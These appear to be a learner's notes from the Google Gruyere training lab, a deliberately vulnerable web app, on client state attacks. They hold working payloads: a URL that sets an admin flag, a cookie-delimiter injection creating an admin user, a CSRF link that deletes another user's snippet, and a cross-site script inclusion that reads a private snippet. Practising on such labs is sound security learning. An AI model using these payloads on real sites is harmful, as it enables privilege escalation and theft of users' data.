# Client State Manipulation

## Escalation of Privilege

<https://google-gruyere.appspot.com/501416180224244987724044863591161268200/saveprofile?action=update&is_admin=True&uid=applesauce>

## Cookie Manipulation

"hash|foo|admin|author||author" but this didn't work.

/saveprofile?action=new&uid=administrator|admin|author&pw=secret < this thing worked>

## Cross Site Request Forgery (CSRF)

### XSRF/CSRF Challenge

<a href="https://google-gruyere.appspot.com/350088668569451251317370671584224987058/deletesnippet?index=0"> Click Me </a>

I put that on another user's snippet, now whichever user will click that, it will delete the first snippet from that user's snippet list. [Sneaky Sneaky!]

## Cross Site Script Inclusion (XSSI/CSSI)

```JS
<script>
function _feed(s) {
  alert("Your private snippet is: " + s['private_snippet']);
}
</script>
<script src="https://google-gruyere.appspot.com/350088668569451251317370671584224987058/feed.gtl"></script>
```

So basically I wrote a feed.html file, it works to load the content but cookie is blocked, because of chrome's security.
